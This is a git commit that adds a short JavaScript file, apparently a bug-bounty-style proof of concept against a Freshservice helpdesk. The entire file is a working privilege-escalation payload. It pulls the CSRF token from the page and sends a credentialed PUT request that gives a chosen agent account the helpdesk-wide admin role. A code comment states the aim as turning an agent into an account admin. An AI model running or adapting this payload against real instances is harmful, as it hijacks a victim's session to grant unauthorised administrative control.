608f6788e7fda1604bd0338a06dc7df9c97a08c6
hartq <HartaRanj@proton.me>
2024-08-28 08:41:25 +0400

    Create Departmentt.js

---
+++ Departmentt.js
@@ -0,0 +1,23 @@
+async function sendRequests() {
+    try {
+        // First step call Csrf-Token by create variable and used var name in the headers
+        const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+
+        // Execute PUT request that convert Agent ==> account admin
+        await fetch('https://h1-h3.freshservice.com/api/_/agents/59000042238/map_workspace_groups_and_roles', {
+            method: 'PUT',
+            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Csrf-Token': csrfToken
+            },
+            body: `{"observer_of":[],"member_of":[],"roles":[{"role_id":59000022168,"assignment_scope":"entire_helpdesk"}],"workspace_id":1}`
+        });
+
+        console.log('Requests completed successfully');
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
+
+sendRequests();
